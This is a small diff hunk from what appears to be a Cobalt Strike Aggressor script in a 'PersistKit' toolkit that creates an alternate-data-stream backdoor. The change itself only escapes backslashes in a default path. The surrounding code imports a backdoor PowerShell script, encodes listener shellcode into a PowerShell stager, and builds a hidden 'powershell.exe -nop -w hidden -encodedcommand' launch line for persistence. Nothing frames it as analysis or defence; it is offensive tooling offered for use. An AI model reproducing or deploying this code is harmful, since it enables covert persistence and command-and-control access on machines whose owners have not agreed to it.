@@ -15,7 +15,7 @@ sub createADSBackdoor {
 	$selectedListener = $2;
 	getADSRegName();
 	bpowershell_import($bid, script_resource("PersistKit/scripts/Invoke-ADSBackdoor.ps1"));
-	prompt_text("Location of file/folder to give ADS (it must exist!)?", "%APPDATA%\Temp\somefile.txt", {
+	prompt_text("Location of file/folder to give ADS (it must exist!)?", "%APPDATA%\\Temp\\somefile.txt", {
 		# Encode shellcode for the stager
 		$psPayload = powershell_encode_stager(shellcode($selectedListener));
 		$fullPsPayload = "powershell.exe -nop -w hidden -encodedcommand $psPayload";
